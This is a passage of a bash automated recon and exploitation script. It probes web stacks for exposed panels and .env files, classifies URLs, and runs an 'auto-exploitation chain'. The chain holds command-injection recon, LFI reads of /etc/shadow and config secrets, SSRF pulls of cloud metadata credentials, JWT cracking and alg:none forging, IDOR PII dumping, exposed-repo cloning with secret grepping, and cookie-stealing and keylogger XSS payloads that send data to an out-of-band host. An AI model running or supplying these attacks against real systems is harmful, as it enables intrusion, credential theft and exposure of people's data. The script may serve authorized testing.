                uniq_add "$O/laravel.txt" "LARAVEL_IGNITION_ENABLED (CVE-2021-3129 RCE): $host/_ignition/execute-solution" && \
                log_hit "Laravel Ignition exposed: $host/_ignition/execute-solution"
            local env_body; env_body=$(_curl "$host/.env" 2>/dev/null | head -c 1500 || true)
            echo "$env_body" | grep -qiE "APP_KEY|DB_PASSWORD|APP_ENV" && \
                uniq_add "$O/laravel.txt" "LARAVEL_ENV_EXPOSED: $host/.env" && \
                log_hit "Laravel .env exposed: $host/.env"
        done
    fi

    # ── Django ────────────────────────────────────────
    if echo "$techs_lc" | grep -q "django"; then
        log_info "Django detected — admin panel + debug mode"
        for host in $(head -5 "$LIVE" 2>/dev/null); do
            local adm; adm=$(_curl -o /dev/null -w "%{http_code}" "$host/admin/" 2>/dev/null || echo 000)
            [[ "$adm" == "200" ]] && \
                uniq_add "$O/django.txt" "DJANGO_ADMIN_EXPOSED (login page reachable): $host/admin/" && \
                log_hit "Django admin exposed: $host/admin/"
            local dbg; dbg=$(_curl "$host/__debug__/" 2>/dev/null | head -c 300 || true)
            echo "$dbg" | grep -qi "django" && \
                uniq_add "$O/django.txt" "DJANGO_DEBUG_TOOLBAR: $host/__debug__/"
        done
    fi

    # ── Spring / Java ─────────────────────────────────
    if echo "$techs_lc" | grep -qiE "spring|java|tomcat|jetty"; then
        log_info "Java stack detected — Spring Boot actuator probes"
        for host in $(head -5 "$LIVE" 2>/dev/null); do
            for p in /actuator /actuator/health /actuator/env /actuator/heapdump \
                     /actuator/mappings /actuator/beans /actuator/configprops; do
                local c; c=$(_curl -o /dev/null -w "%{http_code}" "$host$p" 2>/dev/null || echo 000)
                [[ "$c" == "200" ]] && \
                    uniq_add "$O/spring.txt" "SPRING_ACTUATOR [${p}]: $host$p" && \
                    log_hit "Spring actuator exposed: $host$p"
            done
            # Tomcat manager
            for p in /manager/html /manager/status /host-manager/html; do
                local c; c=$(_curl -o /dev/null -w "%{http_code}" "$host$p" 2>/dev/null || echo 000)
                [[ "$c" =~ ^(200|302|401)$ ]] && \
                    uniq_add "$O/spring.txt" "TOMCAT_MANAGER [${p}] [${c}]: $host$p"
            done
        done
    fi

    # ── Jenkins / CI ──────────────────────────────────
    if echo "$techs_lc" | grep -qiE "jenkins|gitlab|hudson"; then
        for host in $(head -5 "$LIVE" 2>/dev/null); do
            for p in /jenkins /ci /gitlab /-/user; do
                local c; c=$(_curl -o /dev/null -w "%{http_code}" "$host$p" 2>/dev/null || echo 000)
                [[ "$c" == "200" ]] && \
                    uniq_add "$O/ci_cd.txt" "CI_PANEL [${p}]: $host$p" && \
                    log_hit "CI/CD panel: $host$p"
            done
            # Jenkins unauthenticated script console
            local scr; scr=$(_curl -o /dev/null -w "%{http_code}" "$host/jenkins/script" 2>/dev/null || echo 000)
            [[ "$scr" == "200" ]] && \
                uniq_add "$O/ci_cd.txt" "JENKINS_SCRIPT_CONSOLE (unauth RCE): $host/jenkins/script" && \
                log_hit "Jenkins script console unauth: $host/jenkins/script"
        done
    fi

    # ── Monitoring stacks ─────────────────────────────
    if echo "$techs_lc" | grep -qiE "grafana|kibana|prometheus"; then
        for host in $(head -5 "$LIVE" 2>/dev/null); do
            for p in /grafana/login /grafana/api/health /app/kibana /_cat/indices /metrics; do
                local c; c=$(_curl -o /dev/null -w "%{http_code}" "$host$p" 2>/dev/null || echo 000)
                [[ "$c" == "200" ]] && \
                    uniq_add "$O/monitoring.txt" "MONITORING [${p}]: $host$p"
            done
            local gf; gf=$(_curl "$host/grafana/api/dashboards/home" 2>/dev/null | head -c 300 || true)
            echo "$gf" | grep -qiE "dashboard|title" && \
                uniq_add "$O/monitoring.txt" "GRAFANA_ANONYMOUS (CVE-2021-43798 LFI): $host/grafana"
        done
    fi

    # ── phpMyAdmin / DB panels ────────────────────────
    for host in $(head -5 "$LIVE" 2>/dev/null); do
        for p in /phpmyadmin /pma /myadmin /adminer.php /dbadmin; do
            local c; c=$(_curl -o /dev/null -w "%{http_code}" "$host$p" 2>/dev/null || echo 000)
            [[ "$c" =~ ^(200|302)$ ]] && \
                uniq_add "$O/db_panels.txt" "DB_PANEL [${p}] [${c}]: $host$p" && \
                log_hit "Database panel exposed: $host$p"
        done
    done

    # ── Rails ─────────────────────────────────────────
    if echo "$techs_lc" | grep -qiE "rails|ruby"; then
        for host in $(head -5 "$LIVE" 2>/dev/null); do
            local rp; rp=$(_curl -o /dev/null -w "%{http_code}" "$host/rails/info/routes" 2>/dev/null || echo 000)
            [[ "$rp" == "200" ]] && \
                uniq_add "$O/rails.txt" "RAILS_ROUTES_LEAK: $host/rails/info/routes" && \
                log_hit "Rails route info leaked: $host/rails/info/routes"
            local assets; assets=$(_curl -o /dev/null -w "%{http_code}" "$host/assets/application-" 2>/dev/null || echo 000)
            [[ "$assets" == "200" ]] && \
                uniq_add "$O/rails.txt" "RAILS_DEV_SECRETS (development env): $host/assets/"
        done
    fi

    for f in wordpress laravel django spring ci_cd monitoring db_panels rails; do
        sort -u -o "$O/${f}.txt" "$O/${f}.txt" 2>/dev/null || true
    done
    local total_tech; total_tech=$(cat "$O"/*.txt 2>/dev/null | wc -l)
    log_ok "Tech-specific findings: $total_tech → $O/"
}

# ══════════════════════════════════════════════════════
# MODULE 19 — SCREENSHOTS
# ══════════════════════════════════════════════════════
mod_screenshots() {
    [[ "$F_QUICK" == true ]] && return
    progress "MODULE 19 — Screenshots"
    log_section "MODULE 19 — SCREENSHOTS (gowitness)"
    local O="$WORKSPACE/screenshots"
    local LIVE="$WORKSPACE/subdomains/live_urls.txt"

    [[ ! -s "$LIVE" ]] && { log_warn "No live hosts for screenshots"; return; }
    if ! has gowitness; then
        log_warn "gowitness not installed — skipping screenshots"
        return
    fi

    log_info "Screenshotting $(cnt "$LIVE") live hosts..."
    if gowitness --help 2>&1 | grep -q -- "--screenshot-path"; then
        timeout 600 gowitness file -f "$LIVE" \
            --screenshot-path "$O" \
            --threads 10 --timeout 15 2>/dev/null || true
    else
        timeout 600 gowitness file -f "$LIVE" \
            -P "$O" \
            -t 10 --timeout 15 2>/dev/null || true
    fi
    local shots; shots=$(find "$O" -name "*.png" 2>/dev/null | wc -l)
    log_ok "Screenshots taken: $shots → $O/"
}

# ══════════════════════════════════════════════════════
# MODULE 20 — URL CLASSIFIER (IDOR/BAC/upload/export/etc)
# ══════════════════════════════════════════════════════
mod_classify() {
    progress "MODULE 20 — URL Classification"
    log_section "MODULE 20 — URL CLASSIFIER (TARGETED ENDPOINT MAPPING)"
    local C="$WORKSPACE/classified"
    local EP="$WORKSPACE/endpoints/all_endpoints.txt"
    local ALL="$WORKSPACE/urls/all_urls.txt"
    mkdir -p "$C"/{idor,bac,oauth,upload,export,payment,webhook,admin,debug,burp_imports} 2>/dev/null || true

    # ── IDOR-ish endpoints (object access patterns) ──
    grep -iE '(/api/v[0-9]*/)?(users?|accounts?|orders?|invoices?|payments?|transactions?|profiles?|members?|clients?|customers?|products?|posts?|comments?|messages?|conversations?|files?|documents?|downloads?|tickets?|subscriptions?)(/|$)' \
        "$ALL" "$EP" 2>/dev/null | sort -u > "$C/idor/idor_endpoints.txt" || true
    grep -iE '[?&](id|uid|user_id|account_id|order_id|file_id|doc_id|invoice_id|user|account|file|doc|token|ref)=[^&]+' \
        "$ALL" 2>/dev/null | sort -u > "$C/idor/idor_param_urls.txt" || true

    # ── BAC candidates (admin/panel/internal) ─────────
    grep -iE '(admin|dashboard|panel|console|manage|manager|internal|staff|employee|operator|backoffice|control|superuser|root)' \
        "$ALL" "$EP" 2>/dev/null | sort -u > "$C/bac/bac_candidates.txt" || true

    # ── OAuth / SSO ───────────────────────────────────
    grep -iE '(oauth|oidc|sso|saml|authorize|connect/|token|logout|login/|signin|callback|redirect_uri)' \
        "$ALL" "$EP" 2>/dev/null | sort -u > "$C/oauth/oauth_urls.txt" || true

    # ── Upload endpoints ──────────────────────────────
    grep -iE '(upload|uploader|media|attach|avatar|image-upload|file-upload|dropzone|multipart)' \
        "$ALL" "$EP" 2>/dev/null | sort -u > "$C/upload/upload_urls.txt" || true

    # ── Export / download ─────────────────────────────
    grep -iE '(export|download|print|report|generate|dump|csv|excel|pdf\?|xlsx)' \
        "$ALL" "$EP" 2>/dev/null | sort -u > "$C/export/export_urls.txt" || true

    # ── Payment ───────────────────────────────────────
    grep -iE '(checkout|payment|stripe|paypal|braintree|charge|invoice|billing|purchase|order|refund|subscription|price|amount)' \
        "$ALL" "$EP" 2>/dev/null | sort -u > "$C/payment/payment_urls.txt" || true

    # ── Webhooks ──────────────────────────────────────
    grep -iE '(webhook|hook|callback|notify|events?/|pusher|socket)' \
        "$ALL" "$EP" 2>/dev/null | sort -u > "$C/webhook/webhook_urls.txt" || true

    # ── Admin flows ───────────────────────────────────
    grep -iE '(login|signin|sign-in|log-in|auth|authenticate|session|password|forgot|reset|2fa|mfa|otp|verify)' \
        "$ALL" "$EP" 2>/dev/null | sort -u > "$C/admin/auth_urls.txt" || true

    # ── Debug / info leaks ────────────────────────────
    grep -iE '(debug|test|dev|staging|beta|internal|trace|health|status|info|metrics|env|config|swagger|graphql|actuator|\.git|\.env|phpinfo|server-status)' \
        "$ALL" "$EP" 2>/dev/null | sort -u > "$C/debug/debug_urls.txt" || true

    # ── Burp import bundle (scope-aware request lines) ─
    grep -E '^https?://' "$ALL" 2>/dev/null | head -2000 | while IFS= read -r u; do
        echo "GET $u HTTP/1.1" >> "$C/burp_imports/burp_requests.txt" 2>/dev/null || true
        echo "Host: $(echo "$u" | grep -oP 'https?://\K[^/]+')" >> "$C/burp_imports/burp_requests.txt" 2>/dev/null || true
        echo "" >> "$C/burp_imports/burp_requests.txt" 2>/dev/null || true
    done
    sort -u -o "$C/burp_imports/burp_requests.txt" "$C/burp_imports/burp_requests.txt" 2>/dev/null || true

    # ── BAC auto-probe: unauthenticated admin access ──
    log_info "BAC auto-probe: unauthenticated access to admin/panel endpoints..."
    local bac_found=0
    while IFS= read -r url; do
        local c body
        c=$(_curl -o /dev/null -w "%{http_code}" --max-time 8 "$url" 2>/dev/null || echo 000)
        [[ "$c" =~ ^(200|201)$ ]] || continue
        body=$(_curl --max-time 8 "$url" 2>/dev/null | head -c 3000 || true)
        # Not a login page / not a redirect to login
        if ! echo "$body" | grep -qiE "(login|sign in|unauthorized|forbidden|access denied|401)" && \
           echo "$body" | grep -qiE "(dashboard|admin|panel|user[s]? list|statistics|server|config|setting|user management|role|permission)"; then
            uniq_add "$C/bac/bac_confirmed.txt" "BAC_UNAUTH [${c}]: $url"
            log_hit "BAC — admin content unauthenticated: $url"
            ((bac_found++))
        fi
    done < <(head -80 "$C/bac/bac_candidates.txt" 2>/dev/null)
    [[ "$bac_found" -gt 0 ]] && log_hit "BAC CONFIRMED: $bac_found endpoints accessible without auth"

    for d in idor bac oauth upload export payment webhook admin debug; do
        for f in "$C/$d"/*.txt; do
            [[ -f "$f" ]] && sort -u -o "$f" "$f" 2>/dev/null || true
        done
    done

    local total_c; total_c=$(find "$C" -name "*.txt" -type f 2>/dev/null | xargs wc -l 2>/dev/null | tail -1 | awk '{print $1}')
    log_ok "Classifier complete: $total_c classified URLs → $C/"
}

# ══════════════════════════════════════════════════════
# MODULE 21 — AUTO-EXPLOITATION CHAIN 💀
# ══════════════════════════════════════════════════════
mod_exploit_chain() {
    progress "MODULE 21 — AUTO-EXPLOITATION CHAIN"
    log_section "MODULE 21 — AUTO-EXPLOITATION CHAIN 💀"
    local O="$WORKSPACE/vulns/exploit"
    mkdir -p "$O" 2>/dev/null || true

    # ── 0. Import every confirmed finding from prior modules ──
    local CHAIN_IN="$O/chain_input.txt"
    : > "$CHAIN_IN"
    for f in \
        "$WORKSPACE/vulns/cmdi/cmdi_confirmed.txt" \
        "$WORKSPACE/vulns/lfi/lfi_confirmed.txt" \
        "$WORKSPACE/vulns/lfi/lfi_rce.txt" \
        "$WORKSPACE/vulns/ssrf/ssrf_confirmed.txt" \
        "$WORKSPACE/vulns/ssrf/ssrf_divergence.txt" \
        "$WORKSPACE/vulns/ssrf/ssrf_timebased.txt" \
        "$WORKSPACE/vulns/sqli/sqli_findings.txt" \
        "$WORKSPACE/vulns/idor/idor_seq_diff.txt" \
        "$WORKSPACE/vulns/idor/idor_confirmed.txt" \
        "$WORKSPACE/vulns/xss/dalfox_results.txt" \
        "$WORKSPACE/vulns/cors/cors_confirmed.txt" \
        "$WORKSPACE/vulns/oauth/oauth_redirect_uri.txt" \
        "$WORKSPACE/vulns/oauth/oauth_secrets_in_js.txt" \
        "$WORKSPACE/vulns/misconfig/sensitive_files.txt" \
        "$WORKSPACE/classified/bac/bac_confirmed.txt" \
        "$WORKSPACE/subdomains/takeover_candidates.txt" \
        "$WORKSPACE/vulns/nuclei/nuclei_takeover.txt" \
        "$WORKSPACE/vulns/nuclei/nuclei_critical_high.txt" \
        "$WORKSPACE/vulns/tech/wordpress.txt" \
        "$WORKSPACE/vulns/tech/spring.txt" \
        "$WORKSPACE/vulns/tech/ci_cd.txt" \
        2>/dev/null; do
        [[ -s "$f" ]] && cat "$f" >> "$CHAIN_IN"
    done
    sort -u -o "$CHAIN_IN" "$CHAIN_IN"
    local chain_total; chain_total=$(cnt "$CHAIN_IN")
    log_ok "Chain input: $chain_total unique confirmed findings"

    # ── 1. CMDi → full host recon + interactive marker ──
    if [[ -s "$WORKSPACE/vulns/cmdi/cmdi_confirmed.txt" ]]; then
        log_hit "EXPLOIT[CMDi]: executing full host recon on confirmed targets"
        while IFS= read -r line; do
            local target; target=$(echo "$line" | grep -oP 'https?://\S+$' | head -1)
            local payload; payload=$(echo "$line" | grep -oP '(?<=\().*(?=\): )' | head -1)
            [[ -z "$target" || -z "$payload" ]] && continue
            local cmd="${payload}id;whoami;uname -a;cat /etc/hostname;ifconfig 2>/dev/null|head -3"
            local out; out=$(_curl --max-time 10 "$(echo "$target" | qsreplace "$cmd" 2>/dev/null || true)" 2>/dev/null | head -c 2000 || true)
            if [[ -n "$out" ]]; then
                uniq_add "$O/cmdi_recon.txt" "### $target"
                echo "$out" | grep -E "uid=|Linux|hostname|inet " | while IFS= read -r l; do
                    uniq_add "$O/cmdi_recon.txt" "$l"
                done
                uniq_add "$O/chain_confirmed.txt" "RCE[CMDi]: $target"
                log_hit "RCE via CMDi: $target"
            fi
        done < "$WORKSPACE/vulns/cmdi/cmdi_confirmed.txt"
    fi

    # ── 2. LFI → base64 decode verification + deep reads ──
    if [[ -s "$WORKSPACE/vulns/lfi/lfi_confirmed.txt" ]]; then
        log_hit "EXPLOIT[LFI]: verifying + decoding confirmed file reads"
        while IFS= read -r line; do
            local target; target=$(echo "$line" | grep -oP 'https?://\S+$' | head -1)
            [[ -z "$target" ]] && continue
            local dec; dec=$(echo "$line" | grep -q "LFI_B64" && echo yes || echo no)
            if [[ "$dec" == "yes" ]]; then
                local b64out; b64out=$(_curl --max-time 8 "$target" 2>/dev/null | tr -d '\n' | base64 -d 2>/dev/null | head -c 1000 || true)
                [[ -n "$b64out" ]] && { uniq_add "$O/lfi_decoded.txt" "### $target"; echo "$b64out" | while IFS= read -r l; do uniq_add "$O/lfi_decoded.txt" "$l"; done; }
            fi
            # try /etc/shadow + wp-config + env via filter chain
            for deep in \
                "php://filter/convert.base64-encode/resource=/etc/shadow" \
                "php://filter/convert.base64-encode/resource=/proc/1/environ" \
                "php://filter/convert.base64-encode/resource=../wp-config.php" \
                "php://filter/convert.base64-encode/resource=../.env"; do
                local fuzz; fuzz=$(echo "$target" | qsreplace "$deep" 2>/dev/null || true)
                local db; db=$(_curl --max-time 8 "$fuzz" 2>/dev/null | tr -d '\n' | base64 -d 2>/dev/null | head -c 800 || true)
                if echo "$db" | grep -qiE "(root:|APP_KEY|DB_PASSWORD|SECRET|FLAG|aws|BEGIN RSA|private key)"; then
                    uniq_add "$O/lfi_deep.txt" "### $fuzz"
                    echo "$db" | while IFS= read -r l; do uniq_add "$O/lfi_deep.txt" "$l"; done
                    uniq_add "$O/chain_confirmed.txt" "FILE_READ[LFI]: $fuzz"
                    log_hit "LFI deep read (creds/config): $fuzz"
                fi
            done
        done < "$WORKSPACE/vulns/lfi/lfi_confirmed.txt"
    fi

    # ── 3. SQLi → DB fingerprint + banner ──
    if [[ -d "$WORKSPACE/vulns/sqli/sqlmap_active" ]]; then
        log_hit "EXPLOIT[SQLi]: extracting DB fingerprints from sqlmap output"
        find "$WORKSPACE/vulns/sqli/sqlmap_active" -name "log" -type f 2>/dev/null | while IFS= read -r f; do
            local banner; banner=$(grep -iE "(banner|dbms:|back-end DBMS)" "$f" 2>/dev/null | head -3 || true)
            [[ -n "$banner" ]] && { uniq_add "$O/sqli_fingerprint.txt" "### $(basename "$(dirname "$f")")"; echo "$banner" | while IFS= read -r l; do uniq_add "$O/sqli_fingerprint.txt" "$l"; done; }
        done
        [[ -s "$O/sqli_fingerprint.txt" ]] && uniq_add "$O/chain_confirmed.txt" "SQLI[DB-FINGERPRINT]: $(cnt "$O/sqli_fingerprint.txt") lines"
    fi

    # ── 4. IDOR → verify + auto-dump object graph ──
    if [[ -s "$WORKSPACE/vulns/idor/idor_seq_diff.txt" ]]; then
        log_hit "EXPLOIT[IDOR]: verifying candidates + dumping objects"
        while IFS= read -r line; do
            local target; target=$(echo "$line" | grep -oP 'https?://\S+$' | head -1)
            [[ -z "$target" ]] && continue
            local body; body=$(_curl --max-time 8 "$target" 2>/dev/null | head -c 4000 || true)
            if [[ -n "$body" ]] && echo "$body" | grep -qiE '"(email|name|phone|ssn|address|card|iban|dob|username|role|is_admin|billing|account|balance|order|invoice|token)"'; then
                uniq_add "$O/idor_verified.txt" "### $target"
                echo "$body" | jq -c . 2>/dev/null | head -1 | while IFS= read -r l; do uniq_add "$O/idor_verified.txt" "$l"; done
                uniq_add "$O/chain_confirmed.txt" "IDOR[PII-DUMP]: $target"
                log_hit "IDOR verified + PII dumped: $target"
            fi
        done < "$WORKSPACE/vulns/idor/idor_seq_diff.txt"
    fi

    # ── 5. Subdomain takeover → CNAME + fingerprint verify ──
    if [[ -s "$WORKSPACE/subdomains/takeover_candidates.txt" ]]; then
        log_hit "EXPLOIT[TAKEOVER]: verifying dangling CNAMEs"
        while IFS= read -r line; do
            local sub; sub=$(echo "$line" | awk '{print $1}')
            [[ -z "$sub" ]] && continue
            local cname; cname=$(dig +short CNAME "$sub" 2>/dev/null | head -1)
            if [[ -n "$cname" ]]; then
                local resp; resp=$(_curl --max-time 8 "http://$sub" 2>/dev/null | head -c 1500 || true)
                local fp=""
                echo "$cname" | grep -qi "github"      && fp="No such repository"
                echo "$cname" | grep -qi "herokuapp"   && fp="There's nothing here, yet"
                echo "$cname" | grep -qi "cloudfront"  && fp="ERROR: The request could not be satisfied"
                echo "$cname" | grep -qi "azurewebsites" && fp="404 Web Site not found"
                echo "$cname" | grep -qi "netlify"     && fp="Not Found - Request ID"
                echo "$cname" | grep -qi "fastly"      && fp="Fastly error: unknown domain"
                echo "$cname" | grep -qi "s3"          && fp="NoSuchBucket"
                echo "$cname" | grep -qi "pantheon"    && fp="404 error unknown site"
                if [[ -n "$fp" ]] && echo "$resp" | grep -qiE "$(echo "$fp" | sed 's/ /.*/g')"; then
                    uniq_add "$O/takeover_verified.txt" "TAKEOVER_VERIFIED [${cname}]: $sub"
                    uniq_add "$O/chain_confirmed.txt" "SUBDOMAIN_TAKEOVER: $sub"
                    log_hit "SUBDOMAIN TAKEOVER verified: $sub → $cname"
                else
                    uniq_add "$O/takeover_dangling.txt" "DANGLING_CNAME [no fingerprint]: $sub → $cname"
                fi
            fi
        done < <(head -30 "$WORKSPACE/subdomains/takeover_candidates.txt" 2>/dev/null)
    fi

    # ── 6. .git exposure → full clone via git-dumper ──
    if [[ -s "$WORKSPACE/vulns/misconfig/sensitive_files.txt" ]]; then
        grep -i "\.git" "$WORKSPACE/vulns/misconfig/sensitive_files.txt" 2>/dev/null | while IFS= read -r line; do
            local base; base=$(echo "$line" | grep -oP 'https?://\S+' | head -1 | sed 's|/\.git/.*||;s|/\.git$||')
            [[ -z "$base" ]] && continue
            if has git-dumper; then
                log_hit "EXPLOIT[GIT]: cloning exposed repo $base/.git"
                local outdir; outdir="$O/git_$(safe_name "$base")"
                timeout 120 git-dumper "$base/.git" "$outdir" 2>/dev/null || true
                if [[ -d "$outdir" ]]; then
                    local files; files=$(find "$outdir" -type f ! -path "*/.git/*" 2>/dev/null | wc -l)
                    [[ "$files" -gt 0 ]] && {
                        uniq_add "$O/git_cloned.txt" "GIT_CLONED [${files} files]: $base/.git"
                        uniq_add "$O/chain_confirmed.txt" "SOURCE_DISCLOSURE[GIT]: $base/.git"
                        log_hit ".git fully cloned: $base/.git ($files files)"
                        grep -rhiE "(api[_-]?key|secret|password|token|BEGIN (RSA|OPENSSH|EC) PRIVATE)" "$outdir" \
                            --include="*.php" --include="*.py" --include="*.js" --include="*.env" \
                            --include="*.json" --include="*.yml" --include="*.yaml" --include="*.conf" 2>/dev/null \
                            | grep -viE "(example|test_|your_|xxxx|password_field|password_confirmation)" \
                            | sort -u | head -50 > "$O/git_secrets.txt"
                        [[ -s "$O/git_secrets.txt" ]] && log_hit "Secrets in cloned repo: $(cnt "$O/git_secrets.txt")"
                    }
                fi
            else
                log_warn "git-dumper not installed — manual: git-dumper $base/.git $O/git_manual"
            fi
        done
    fi

    # ── 7. SSRF → OOB re-fire + metadata sweep ──
    if [[ -s "$WORKSPACE/vulns/ssrf/ssrf_confirmed.txt" ]] && [[ -n "${INTERACTSH_DOMAIN:-}" ]]; then
        log_hit "EXPLOIT[SSRF]: re-firing OOB + metadata sweep on confirmed"
        while IFS= read -r line; do
            local target; target=$(echo "$line" | grep -oP 'https?://\S+$' | head -1)
            [[ -z "$target" ]] && continue
            local rand; rand="srv$(head -c 6 /dev/urandom | xxd -p)"
            local oob="http://${rand}.${INTERACTSH_DOMAIN}/"
            _curl --max-time 6 "$(echo "$target" | qsreplace "$oob" 2>/dev/null || true)" >/dev/null 2>&1 || true
            uniq_add "$O/ssrf_oob_fired.txt" "OOB_FIRED [${rand}.${INTERACTSH_DOMAIN}]: $target"
            # metadata via every confirmed entry
            for region in "169.254.169.254/latest/meta-data/iam/security-credentials/" \
                          "169.254.169.254/latest/user-data/" \
                          "metadata.google.internal/computeMetadata/v1/?recursive=true"; do
                local murl; murl=$(echo "$target" | qsreplace "http://${region}" 2>/dev/null || true)
                local mb; mb=$(_curl --max-time 8 -H "Metadata-Flavor: Google" "$murl" 2>/dev/null | head -c 3000 || true)
                if echo "$mb" | grep -qiE "(AccessKeyId|SecretAccessKey|Token|accountId|project|serviceAccount)"; then
                    uniq_add "$O/cloud_creds.txt" "### $target"
                    echo "$mb" | while IFS= read -r l; do uniq_add "$O/cloud_creds.txt" "$l"; done
                    uniq_add "$O/chain_confirmed.txt" "CLOUD_CREDENTIALS[SSRF]: $target"
                    log_hit "CLOUD CREDENTIALS via SSRF: $target"
                fi
            done
        done < "$WORKSPACE/vulns/ssrf/ssrf_confirmed.txt"
    fi

    # ── 8. JWT → alg:none + weak-secret crack ──
    local JWT_FILE="$WORKSPACE/js/jwt_tokens.txt"
    if [[ -s "$JWT_FILE" ]] && [[ -f "$HOME/tools/jwt_tool/jwt_tool.py" ]]; then
        log_hit "EXPLOIT[JWT]: cracking weak secrets + alg:none test"
        local jwt_wl="$O/weak_jwt_secrets.txt"
        cat > "$jwt_wl" << 'JWTWL'
secret
Secret
SECRET
password
123456
admin
administrator
changeme
letmein
qwerty
key
Key
secretkey
secret_key
mysecret
jwt
JWT
token
Token
tokens
supersecret
private
public
login
password123
pass
test
testing
default
jwt_secret
auth
authentication
12345678
123456789
abcdef
access
Access
AccessToken
JWT_SECRET
development
prod
production
JWTWL
        local n=0
        while IFS= read -r token && [[ $n -lt 30 ]]; do
            n=$((n+1))
            local cracked; cracked=$(python3 "$HOME/tools/jwt_tool/jwt_tool.py" -C "$jwt_wl" "$token" 2>/dev/null \
                | grep -oE "It worked!.*" | head -1 || true)
            if [[ -n "$cracked" ]]; then
                uniq_add "$O/jwt_cracked.txt" "JWT_WEAK_SECRET [${cracked}]: $token"
                uniq_add "$O/chain_confirmed.txt" "JWT_FORGE[WEAK_SECRET]: $token"
                log_hit "JWT weak secret: $cracked"
            fi
            local alg_none; alg_none=$(python3 "$HOME/tools/jwt_tool/jwt_tool.py" -X a "$token" 2>/dev/null \
                | grep -oE "eyJ[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*\." | head -1 || true)
            [[ -n "$alg_none" ]] && {
                uniq_add "$O/jwt_alg_none.txt" "JWT_ALG_NONE_FORGED: $alg_none (orig: ${token:0:60}...)"
                log_hit "JWT alg:none forged token ready: ${alg_none:0:40}..."
            }
        done < "$JWT_FILE"
    fi

    # ── 9. Sensitive files → content triage ──
    if [[ -s "$WORKSPACE/vulns/misconfig/sensitive_files.txt" ]]; then
        log_hit "EXPLOIT[SENSITIVE]: triaging exposed files for secrets"
        while IFS= read -r line; do
            local target; target=$(echo "$line" | grep -oP 'https?://\S+$' | head -1)
            [[ -z "$target" ]] && continue
            local body; body=$(_curl --max-time 8 "$target" 2>/dev/null | head -c 4000 || true)
            if echo "$body" | grep -qiE "(aws_access_key|secret_access|BEGIN (RSA|OPENSSH) PRIVATE|db_password|DB_PASSWORD|APP_KEY|client_secret|api_key|private_key|password *=|passwd *=|SLACK_|STRIPE_|GH_TOKEN|AKIA[0-9A-Z]{16})"; then
                uniq_add "$O/sensitive_triaged.txt" "### $target"
                echo "$body" | grep -iE "(aws_access|secret_access|BEGIN (RSA|OPENSSH) PRIVATE|db_password|DB_PASSWORD|APP_KEY|client_secret|api_key|private_key|password *=|SLACK_|STRIPE_|GH_TOKEN|AKIA[0-9A-Z]{16})" \
                    | head -10 | while IFS= read -r l; do uniq_add "$O/sensitive_triaged.txt" "$l"; done
                uniq_add "$O/chain_confirmed.txt" "SECRET_EXPOSED: $target"
                log_hit "Secrets in exposed file: $target"
            fi
        done < "$WORKSPACE/vulns/misconfig/sensitive_files.txt"
    fi

    # ── 10. BAC verified → deeper admin probing ──
    if [[ -s "$WORKSPACE/classified/bac/bac_confirmed.txt" ]]; then
        log_hit "EXPLOIT[BAC]: probing deeper admin surface on confirmed hosts"
        while IFS= read -r line; do
            local target; target=$(echo "$line" | grep -oP 'https?://\S+$' | head -1)
            [[ -z "$target" ]] && continue
            local base; base=$(echo "$target" | grep -oP 'https?://[^/]+' || true)
            local path; path=$(echo "$target" | grep -oP '(?<=://)[^/]+\K/.*' || true)
            [[ -z "$base" || -z "$path" ]] && continue
            for probe in \
                "${path}users" "${path}users/list" "${path}users?limit=100" \
                "${path}config" "${path}settings" "${path}logs" \
                "${path}api/v1/users" "${path}api/users" \
                "${path}export?format=csv" "${path}download?file=users.csv" \
                "${path}../users" "${path}?debug=1"; do
                local c body
                c=$(_curl -o /dev/null -w "%{http_code}" --max-time 6 "$base$probe" 2>/dev/null || echo 000)
                [[ "$c" =~ ^(200|201)$ ]] || continue
                body=$(_curl --max-time 6 "$base$probe" 2>/dev/null | head -c 1500 || true)
                echo "$body" | grep -qiE '"(users|email|username|id|role|is_admin|data|records|total)"' && {
                    uniq_add "$O/bac_deep.txt" "BAC_DEEP [${c}]: $base$probe"
                    uniq_add "$O/chain_confirmed.txt" "BAC_DATA_ACCESS: $base$probe"
                    log_hit "BAC deep data access: $base$probe"
                }
            done
        done < "$WORKSPACE/classified/bac/bac_confirmed.txt"
    fi

    # ── 11. XSS → proof-of-concept generator (self-contained) ──
    if [[ -s "$WORKSPACE/vulns/xss/dalfox_results.txt" ]]; then
        log_hit "EXPLOIT[XSS]: writing PoC + keylogger payload stubs"
        local poc="$O/xss_pocs.txt"
        : > "$poc"
        while IFS= read -r line; do
            local target; target=$(echo "$line" | grep -oP 'https?://[^ ]+' | head -1)
            [[ -z "$target" ]] && continue
            local base; base=$(echo "$target" | grep -oP 'https?://[^?]+' | head -1)
            local params; params=$(echo "$target" | grep -oP '\?.*' | head -1 | tr '&' '\n' | sed 's/=.*/=/')
            local vuln_params=""
            while IFS= read -r p; do
                [[ -n "$p" ]] && vuln_params="$vuln_params$p"
            done <<< "$params"
            uniq_add "$poc" "### PoC: $base${vuln_params}PAYLOAD"
            uniq_add "$poc" "### <script>fetch('https://$INTERACTSH_DOMAIN/xss?c='+document.cookie)</script>"
            uniq_add "$poc" "### keylogger: <script>document.onkeypress=e=>fetch('https://$INTERACTSH_DOMAIN/k?k='+e.key)</script>"
        done < "$WORKSPACE/vulns/xss/dalfox_results.txt"
        uniq_add "$O/chain_confirmed.txt" "XSS[POC-GENERATED]: $(cnt "$poc") lines"
    fi

    # ── 12. Final chain summary ──
    sort -u -o "$O/chain_confirmed.txt" "$O/chain_confirmed.txt" 2>/dev/null || true
    local chain_final; chain_final=$(cnt "$O/chain_confirmed.txt")
    log_section "MODULE 21 — EXPLOITATION CHAIN SUMMARY"
    if [[ "$chain_final" -eq 0 ]]; then
        log_warn "No chain-confirmed exploits — findings remain at detection level"
    else
        log_hit "CHAIN CONFIRMED: $chain_final exploitable primitives"
        echo ""
        echo -e "  ${BOLD}${RED}⚡ EXPLOITATION CHAIN RESULTS ⚡${NC}"
        grep -oE '^[A-Z_]+\[[A-Z_-]+\]' "$O/chain_confirmed.txt" 2>/dev/null \
            | sort | uniq -c | sort -rn | while IFS= read -r l; do
                echo -e "  ${SYM_BUG} ${BOLD}$l${NC}"
            done
        echo ""
        log_ok "Full chain artifacts → $O/"
    fi
}

# ══════════════════════════════════════════════════════
# MODULE 22 — REPORT GENERATOR (HTML + Markdown)
# ══════════════════════════════════════════════════════
html_esc() { sed 's/&/\&amp;/g; s/</\&lt;/g; s/>/\&gt;/g; s/"/\&quot;/g' <<< "$1"; }

mod_report() {
